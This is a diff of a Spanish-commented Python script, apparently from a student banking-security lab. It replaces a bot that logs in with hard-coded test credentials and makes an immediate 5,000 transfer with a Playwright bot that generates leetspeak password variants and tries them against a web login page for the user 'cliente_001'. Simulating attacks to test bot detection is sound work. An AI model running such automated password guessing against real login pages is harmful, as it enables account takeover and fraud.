@@ -1,67 +1,61 @@
-import requests
+import asyncio
 import time
+from playwright.async_api import async_playwright
 
-# ── Configuración de Entorno ──────────────────────────────────────────
-# Cambia 'localhost:8000' por la IP o dominio de la VM de tu compañera
-API_BASE = "http://localhost:8000" 
+HTML_URL = "https://statue-essential-dirtiness.ngrok-free.dev"  # la URL donde corre tu frontend
+TARGET_USER = "cliente_001"
 
-# Credenciales de prueba tomadas de la BD del proyecto
-BOT_CREDENTIALS = {
-    "username": "cliente_001",
-    "password": "Banco$ecure#2024",
-    "destination": "MX-9012-3344",
-    "amount": 5000.00
-}
+# Generación heurística de contraseñas
+CONTEXT_KEYWORDS = ["Banco", "Secure"]
+YEARS = ["2024", "2026"]
+SYMBOLS = ["$", "#"]
 
-def execute_bot_attack():
-    session = requests.Session()
-    print("🤖 [BOT] Iniciando simulación de ataque y login...")
+def generate_passwords():
+    generated = set()
+    for base in CONTEXT_KEYWORDS:
+        for yr in YEARS:
+            for sym in SYMBOLS:
+                leet = base.replace('e', '3').replace('s', '$')
+                generated.add(f"{base}{yr}")
+                generated.add(f"{leet}{sym}{yr}")
+                generated.add(f"Banco$ecure#{yr}")
+    return list(generated)
 
-    # --- PASO 1: LOGIN ---
-    login_payload = {
-        "username": BOT_CREDENTIALS["username"],
-        "password": BOT_CREDENTIALS["password"],
-        "user_speed": 0.03  # 30ms -> Inyección sobrehumana
-    }
+async def run_gui_adaptive_bot():
+    candidates = generate_passwords()
+    print(f"🤖 [BOT GUI] Iniciando simulación visual con {len(candidates)} candidatas...")
 
-    start_time = time.time()
-    try:
-        res_login = session.post(
-            f"{API_BASE}/api/v1/auth/login",
-            json=login_payload,
-            headers={"Content-Type": "application/json"}
-        )
+    async with async_playwright() as p:
+        # headless=False abre la ventana del navegador para que veas la interacción
+        browser = await p.chromium.launch(headless=False, slow_mo=50)
+        page = await browser.new_page()
 
-        if res_login.status_code != 200:
-            print(f"❌ Falló el inicio de sesión ({res_login.status_code}):", res_login.json())
-            return
+        for attempt, pwd in enumerate(candidates, 1):
+            print(f"🤖 Intento {attempt}: Ingresando contraseña '{pwd}'...")
+            
+            # 1. Abre o recarga la página de inicio
+            await page.goto(HTML_URL)
 
-        user_data = res_login.json()
-        account_id = user_data.get("account_id", "MX-4821-0001")
-        full_name = user_data.get("full_name", "Cliente")
-        print(f"✅ Login Exitoso | Usuario: {full_name} | Cuenta: {account_id}")
+            # 2. Llena los campos en la interfaz
+            await page.fill("#username", TARGET_USER)
+            await page.fill("#password", pwd)
+            
+            # 3. Hace clic en el botón de login
+            await page.click("#btnLogin")
+            
+            # Espera breve para verificar si la interfaz cambió o si dio error
+            await page.wait_for_timeout(1000)
 
-        # --- PASO 2: TRANSACCIÓN INMEDIATA ---
-        txn_payload = {
-            "account_id": account_id,
-            "destination_account": BOT_CREDENTIALS["destination"],
-            "amount": BOT_CREDENTIALS["amount"],
-            "user_speed": 0.01  # 10ms -> Llenado automatizado
-        }
+            # Si el elemento de la vista post-login aparece, el ataque tuvo éxito
+            if await page.is_visible("#viewTxn"):
+                print(f"✅ ¡Éxito en la interfaz! Contraseña correcta: '{pwd}'")
+                await page.wait_for_timeout(3000)
+                await browser.close()
+                return
 
-        res_txn = session.post(
-            f"{API_BASE}/api/v1/transactions/transfer",
-            json=txn_payload,
-            headers={"Content-Type": "application/json"}
-        )
+            print(f"❌ Intento {attempt} fallido en la interfaz.")
 
-        elapsed = time.time() - start_time
-        print(f"⏱️ Tiempo total de ejecución del Bot: {elapsed:.3f}s")
-        print(f"📊 Status Code Transacción: {res_txn.status_code}")
-        print(f"📩 Respuesta del Backend (VM):", res_txn.json())
-
-    except requests.exceptions.RequestException as e:
-        print(f"❌ Error de conexión al backend en {API_BASE}: {e}")
+        await browser.close()
 
 if __name__ == "__main__":
-    execute_bot_attack()
+    asyncio.run(run_gui_adaptive_bot())
